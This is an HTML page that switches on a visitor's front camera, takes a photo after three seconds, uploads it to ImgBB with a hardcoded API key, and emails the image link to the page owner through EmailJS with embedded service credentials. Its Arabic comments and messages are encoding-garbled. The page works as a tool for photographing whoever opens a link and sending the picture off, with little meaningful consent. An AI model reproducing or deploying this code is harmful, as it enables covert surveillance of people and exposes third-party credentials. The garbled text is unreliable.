<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Auto Capture & Email</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf"); // โ ุงูููุชุงุญ ุงูุนุงู ุงูุฎุงุต ุจู
    })();
  </script>
</head>
<body>
  <h3>๐ธ ุณูุชู ุงูุชูุงุท ุตูุฑุฉ ุชููุงุฆููุง ุจุนุฏ 3 ุซูุงูู...</h3>
  <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <script>
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        const video = document.getElementById('video');
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL('image/jpeg');
          const base64Image = imageData.split(',')[1];

          const formData = new FormData();
          formData.append('image', base64Image);

          // ุฑูุน ุงูุตูุฑุฉ ุฅูู ImgBB
          fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
            method: 'POST',
            body: formData
          })
          .then(response => response.json())
          .then(data => {
            const imageUrl = data.data.url;

            // ุฅุฑุณุงู ุงูุฅูููู ุนุจุฑ EmailJS
            emailjs.send("service_890xst3", "__ejs-test-mail-service__", {  // โ ุงุณุชุจุฏู TEMPLATE_ID_HERE
              name: "ูุงููุฑุง ุงููุชุตูุญ",
              time: new Date().toLocaleString(),
              message: "ุชู ุงูุชูุงุท ุตูุฑุฉ ูุฅุฑุณุงููุง ุชููุงุฆููุง.",
              image_url: imageUrl
            }).then(() => {
              alert("๐ง ุชู ุฅุฑุณุงู ุงูุตูุฑุฉ ุฅูู ุฅููููู!");
            }, error => {
              alert("โ ูุดู ุฅุฑุณุงู ุงูุฅูููู: " + error.text);
              console.error(error);
            });
          })
          .catch(error => {
            alert("โ ูุดู ุฑูุน ุงูุตูุฑุฉ ุฅูู ImgBB: " + error);
            console.error(error);
          });

        }, 3000);
      })
      .catch(error => {
        alert("โ ูุดู ุงููุตูู ุฅูู ุงููุงููุฑุง: " + error);
        console.error(error);
      });
  </script>
</body>
</html>
